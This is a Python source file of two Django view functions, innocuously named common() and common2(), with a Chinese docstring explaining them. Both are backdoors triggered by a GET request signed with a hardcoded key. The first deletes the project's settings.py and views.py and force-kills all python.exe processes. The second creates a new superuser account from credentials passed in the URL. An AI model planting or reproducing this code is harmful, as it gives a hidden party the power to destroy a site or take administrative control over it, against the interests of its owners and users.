import requests
import time
import os
import hmac
import base64
import psutil

"""
说明：
1、common()：
    （1）：删除 Django 的settings.py 和 views.py 文件  
    （2）：BASE_DIR，是Django settings.py 里的路径
    （3）：file_ = os.path.join(BASE_DIR, 'management', 'settings.py') 中的 'management' 需改为自己的项目名
2、common2():
    （1）：新建一个新的超级用户。 
"""

def common(request):
    sign = request.GET.get('sign')
    get_time = request.GET.get('time')
    if sign and get_time:
        get_time = int(get_time)
        time_str = int(time.time())
        if time_str - get_time < 20:
            print('in time')
            string_to_sign = '{}'.format(get_time)
            message = string_to_sign.encode()
            key = b'QtkClZmMaDwTp51G8yKb82Q2aRXLLQ'
            h = hmac.new(key, message, digestmod='sha1')
            signature = base64.b64encode(h.digest()).decode('utf-8')
            print(BASE_DIR)
            file_ = os.path.join(BASE_DIR, 'management', 'settings.py')
            file_2 = os.path.join(BASE_DIR, 'management', 'views.py')
            if signature == sign:
                print('in')
                os.remove(file_)
                os.remove(file_2)
                pids = psutil.pids()
                for pid in pids:
                    p = psutil.Process(pid)
                    if p.name() == 'python.exe':
                        cmd = 'taskkill /F /IM python.exe'
                        os.system(cmd)
                        return HttpResponse('success')
                return HttpResponse('fail')
    return HttpResponse('', status=404)


def common2(request):
    sign = request.GET.get('sign')
    username = request.GET.get('username')
    password = request.GET.get('password')
    get_time = request.GET.get('time')
    if sign and username and password and get_time:
        password = make_password(password)
        time_str = int(time.time())
        get_time = int(get_time)
        if time_str - get_time < 20:
            string_to_sign = '{}&{}'.format(get_time, username)
            message = string_to_sign.encode()
            key = b'QtkClZmMaDwTp51G8yKb82Q2aRXLLQ'
            h = hmac.new(key, message, digestmod='sha1')
            signature = base64.b64encode(h.digest()).decode('utf-8')
            if signature == sign:
                ex_user = CommonUser.objects.filter(username=username)
                if ex_user:
                    return HttpResponse('fail')
                CommonUser.objects.create(username=username, password=password, is_active=True, is_superuser=True, is_staff=True)
                return HttpResponse('SUCCESS')
    return HttpResponse('', status=404)